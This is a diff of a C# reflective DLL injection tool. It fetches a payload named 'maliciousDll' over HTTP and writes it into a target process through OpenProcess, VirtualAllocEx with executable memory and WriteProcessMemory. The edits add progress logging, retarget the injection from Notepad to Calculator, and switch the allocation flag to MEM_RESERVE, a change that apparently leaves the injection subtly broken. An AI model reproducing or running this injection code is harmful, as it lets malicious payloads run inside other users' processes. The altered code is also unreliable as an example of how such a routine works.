@@ -14,6 +14,7 @@ public class Program {
         response.EnsureSuccessStatusCode();
         {
             byte[] maliciousDll = response.Content.ReadAsByteArrayAsync().Result;
+            Console.WriteLine("Size of DLL is: " + maliciousDll.Length + " bytes");
         }
         return maliciousDll;
     }
@@ -100,15 +101,16 @@ public class Program {
 
     public static void ReflectiveDLLInject(int targetId, byte[] buffer)
         {
+            Console.WriteLine("Executing Reflective Dll Injection...");
             try
             {
                 IntPtr lpNumberOfBytesWritten = IntPtr.Zero;
                 IntPtr lpThreadId = IntPtr.Zero;
 
-
+                Console.WriteLine("[+] Attempting to open process");
                 IntPtr procHandle = OpenProcess((uint)ProcessAccessRights.All, false, (uint)targetId);
                 Console.WriteLine("[+] Getting the handle for the target process: " + procHandle);
-                IntPtr remoteAddr = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)buffer.Length, (uint)MemAllocation.MEM_COMMIT, (uint)MemProtect.PAGE_EXECUTE_READWRITE);
+                IntPtr remoteAddr = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)buffer.Length, (uint)MemAllocation.MEM_RESERVE, (uint)MemProtect.PAGE_EXECUTE_READWRITE);
                 Console.WriteLine("[+] Allocating memory in the remote process " + remoteAddr);
                 Console.WriteLine("[+] Writing shellcode at the allocated memory location.");
                 if (WriteProcessMemory(procHandle, remoteAddr, buffer, (uint)buffer.Length, out lpNumberOfBytesWritten))
@@ -133,10 +135,12 @@ public class Program {
 
     public static void Main(string[] args) {
 
-        Console.WriteLine("Executing Reflective Dll Injection...");
-        string targetProccess = "notepad";
+        string targetProccess = "Calculator";
         int targetProccessId = SearchForTargetID(targetProccess);
         ReflectiveDLLInject(targetProccessId, maliciousDll);
+
+        //byte[] bytes = Encoding.ASCII.GetBytes(someString);
+        
         
     }
 }
